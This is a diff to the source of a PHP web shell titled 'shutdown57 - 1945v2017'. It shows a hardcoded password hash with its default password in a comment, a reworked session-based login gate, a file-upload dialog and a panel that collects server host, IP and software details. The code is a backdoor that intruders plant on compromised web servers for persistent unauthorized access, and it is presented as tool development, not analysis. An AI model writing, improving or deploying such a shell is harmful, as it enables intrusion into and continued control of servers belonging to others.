@@ -15,26 +15,27 @@ session_start();
 @ini_set('upload_max_filesize',1000);
 @ini_set('error_log','.error-log-1945.txt'); // save error log , report if any error to : alinkokomansuby@gmail.com
 $passwd_45 		= "fe4530f3758f14e06d97b05f44c9f856"; // default password : indonesianpeople
-$session_45 	= $_SESSION[md5($_SERVER['HTTP_HOST'])];
+$session_name = "_session_1945_v2017";
+$session_45 	= $_SESSION[md5($_SERVER['HTTP_HOST'].$session_name)];
 $image_bg_45 	= "http://wallpapers-best.com/uploads/posts/2015-10/1_indonesia.jpg";
 
-function passwd_45_login($wallpaper) { 
+function passwd_45_login($wallpaper) {
 	echo "<html><head><title>".$_SERVER['HTTP_HOST']." - shutdown57 - 1945v2017</title></head><body>";
 	echo "<style>body{background:url('".$wallpaper."')no-repeat center center;";
 	echo "background-size:cover;background-attachment:fixed;-o-background-size:cover;-moz-background-size:cover;-webkit-background-size:cover;";
 	echo "-o-background-attachment:fixed;-moz-background-attachment:fixed;-webkit-background-attachment:fixed}";
-	echo "input{color:green;border:1px solid green;margin-top:250px;margin-bottom:250px;background:transparent;}";
+	echo "input{color:green;border:1px solid green;margin-top:250px;margin-bottom:250px;background:transparent;box-shadow:0px 3px 6px #fff}";
 	echo "</style>";
     echo "<form method='POST'><center><input type='password' name='pass' placeholder='Password'><input type='submit' value='>>'></center></form>";
-   exit; 
-} 
+   exit;
+}
 
 
-if(!isset($session_45)){ 
-    if(empty($passwd_45)||(isset($_POST['pass'])&&(md5($_POST['pass'])==$passwd_45))){ 
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
+if(!isset($session_45)){
+    if(empty($passwd_45)||(isset($_POST['pass'])&&(md5($_POST['pass'])==$passwd_45))){
+        $_SESSION[md5($_SERVER['HTTP_HOST'].$session_name)] = true;
 
-}else{ 
+}else{
         passwd_45_login($image_bg_45);
 }
 }
@@ -416,7 +417,7 @@ echo '
   <label for="modal_1" class="overlay"></label>
   <article>
     <header>
-      <h3>Great offer</h3>
+      <h3>Upload to : '.$dir.'</h3>
       <label for="modal_1" class="close">&times;</label>
     </header>
     <section class="content">';
@@ -475,7 +476,7 @@ echo '
 			$apache_load_module = "";
 		}
 		$html = new Html45();
-		
+
 		$head = "Security Info : ".$_SERVER['HTTP_HOST']." < ".gethostbyname($_SERVER['HTTP_HOST'])." > ";
 		$konten = "<b> Server Software :". $_SERVER['SERVER_SOFTWARE'] . "</b><hr>";
 		$konten.= $apache_load_module."<hr>";
